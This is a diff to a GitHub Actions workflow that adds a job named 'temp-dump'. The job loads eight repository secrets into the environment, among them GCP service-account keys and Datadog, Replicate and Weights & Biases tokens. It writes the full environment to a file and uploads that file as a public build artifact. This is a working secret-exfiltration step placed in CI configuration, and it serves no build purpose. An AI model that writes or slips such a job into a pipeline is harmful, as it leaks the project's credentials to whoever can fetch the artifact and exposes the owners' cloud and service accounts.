@@ -12,6 +12,27 @@ on:
   push:
 
 jobs:
+  temp-dump:
+    name: Dump env
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump env
+        run: env > env.txt
+        env:
+          CYPRESS_DEPLOYSENTINEL_KEY: ${{ secrets.CYPRESS_DEPLOYSENTINEL_KEY }}
+          CYPRESS_RECORD_KEY: ${{ secrets.CYPRESS_RECORD_KEY }}
+          DD_API_KEY: ${{ secrets.DD_API_KEY }}
+          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
+          GCP_WB_SA_KEY: ${{ secrets.GCP_WB_SA_KEY }}
+          REPLICATE_API_TOKEN: ${{ secrets.REPLICATE_API_TOKEN }}
+          WANDB_API_KEY: ${{ secrets.WANDB_API_KEY }}
+          WANDB_CORE_ACCESS_TOKEN: ${{ secrets.WANDB_CORE_ACCESS_TOKEN }}
+      - name: Upload env
+        uses: actions/upload-artifact@v3
+        with:
+          name: env-dump
+          path: env.txt
+          retention-days: 1
   build-container:
     name: Build test container
     timeout-minutes: 20
